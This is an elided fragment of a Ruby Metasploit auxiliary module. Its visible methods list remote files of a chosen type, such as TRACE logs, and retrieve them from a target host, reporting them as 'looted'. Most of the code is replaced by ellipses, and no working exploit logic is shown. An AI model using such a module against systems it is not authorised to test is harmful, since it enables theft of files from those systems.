...
class MetasploitModule < Msf::Auxiliary
  ...
  def listfiles(rhost)
    ...
    when /^TRACE/i
      ...
      print_error("unsupported filetype #{datastore['FILETYPE']}")
      return
    end
    ...
    if success
      print_good("#{datastore['FILETYPE'].downcase}: #{env.length} files available")
  ...
  def gettfiles(rhost, logfile, filelen)
    if filelen
      print_status("Attempting to retrieve file #{logfile} (#{filelen} bytes)")
    else
      print_status("Attempting to retrieve file #{logfile} (size unknown)")
    end
    success = false
    ...
    if success
      print_good("#{datastore['FILETYPE'].downcase}:#{logfile.downcase} looted")
